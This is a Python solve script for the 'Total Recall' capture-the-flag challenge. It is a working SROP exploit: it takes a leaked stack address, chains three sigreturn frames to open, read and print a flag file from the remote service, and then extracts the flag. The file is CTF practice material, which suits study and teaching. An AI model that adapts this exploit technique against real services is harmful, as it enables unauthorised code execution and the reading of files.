#!/usr/bin/env python3
"""Solve SunshineCTF 2026 - Total Recall."""

import argparse
import re
import socket
import struct
import time
from typing import Tuple

READ_GADGET = 0x401031
SYSCALL_RET = 0x401069
EXIT = 0x40100A
READ_SIZE = 0x400
MASK64 = (1 << 64) - 1


def put_qword(buf: bytearray, offset: int, value: int) -> None:
    struct.pack_into("<Q", buf, offset, value & MASK64)


def sigreturn_frame(
    *, rax: int, rdi: int, rsi: int, rdx: int, r10: int, rsp: int
) -> bytearray:
    """Build the 304-byte x86-64 Linux signal frame used by rt_sigreturn."""
    frame = bytearray(304)
    for offset, value in (
        (56, r10),
        (104, rdi),
        (112, rsi),
        (136, rdx),
        (144, rax),
        (160, rsp),
        (168, SYSCALL_RET),
        (176, 0x202),
    ):
        put_qword(frame, offset, value)
    struct.pack_into("<H", frame, 184, 0x33)  # user code segment
    struct.pack_into("<H", frame, 190, 0x2B)  # user stack segment
    return frame


def build_stage(leak: int, path: str) -> Tuple[bytearray, int]:
    buf_addr = leak - 0x80
    stage = bytearray(b"A" * READ_SIZE)

    # Initial short read already completed; this address is the saved return.
    put_qword(stage, 0x80, READ_GADGET)
    put_qword(stage, 0x88, 0)
    put_qword(stage, 0x90, SYSCALL_RET)

    path_bytes = path.encode() + b"\0"
    if len(path_bytes) > 0x30:
        raise ValueError("path is too long for the reserved stack area")
    stage[0x20 : 0x20 + len(path_bytes)] = path_bytes

    frame1 = sigreturn_frame(
        rax=257, rdi=-100, rsi=buf_addr + 0x20,
        rdx=0, r10=0, rsp=buf_addr + 0x1D0,
    )
    stage[0x98 : 0x98 + len(frame1)] = frame1
    put_qword(stage, 0x1D0, READ_GADGET)
    put_qword(stage, 0x1D8, 0)
    put_qword(stage, 0x1E0, SYSCALL_RET)

    frame2 = sigreturn_frame(
        rax=0, rdi=3, rsi=buf_addr + 0x12C,
        rdx=128, r10=0, rsp=buf_addr + 0x2A8,
    )
    stage[0x1E8 : 0x1E8 + len(frame2)] = frame2
    put_qword(stage, 0x2A8, READ_GADGET)
    put_qword(stage, 0x2B0, 0)
    put_qword(stage, 0x2B8, SYSCALL_RET)

    frame3 = sigreturn_frame(
        rax=1, rdi=1, rsi=buf_addr + 0x12C,
        rdx=128, r10=0, rsp=buf_addr + 0x3F0,
    )
    stage[0x2C0 : 0x2C0 + len(frame3)] = frame3
    put_qword(stage, 0x3F0, EXIT)
    return stage, buf_addr


def recv_exact(sock: socket.socket, count: int) -> bytes:
    data = bytearray()
    while len(data) < count:
        part = sock.recv(count - len(data))
        if not part:
            raise ConnectionError("service closed before sending the stack address")
        data.extend(part)
    return bytes(data)


def receive_to_close(sock: socket.socket) -> bytes:
    result = bytearray()
    sock.settimeout(3.0)
    try:
        while True:
            part = sock.recv(4096)
            if not part:
                break
            result.extend(part)
    except socket.timeout:
        pass
    return bytes(result)


def solve(host: str, port: int, path: str) -> bytes:
    with socket.create_connection((host, port), timeout=5.0) as sock:
        sock.settimeout(5.0)
        leak = struct.unpack("<Q", recv_exact(sock, 8))[0]
        sock.sendall(b"\0" * 24)
        stage, _ = build_stage(leak, path)
        sock.sendall(stage)

        # One 15-byte read sets rax to 15 for each rt_sigreturn transition.
        kick = b"123456789012345"
        for _ in range(3):
            time.sleep(0.25)
            sock.sendall(kick)

        return receive_to_close(sock)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="chal.sunshinectf.games")
    parser.add_argument("--port", type=int, default=26003)
    parser.add_argument("--path", default="./flag.txt")
    args = parser.parse_args()

    response = solve(args.host, args.port, args.path)
    match = re.search(rb"sun\{[^}\r\n]{1,120}\}", response)
    if not match:
        raise SystemExit("No sun{...} flag found in the service response")
    print(match.group(0).decode("ascii"))


if __name__ == "__main__":
    main()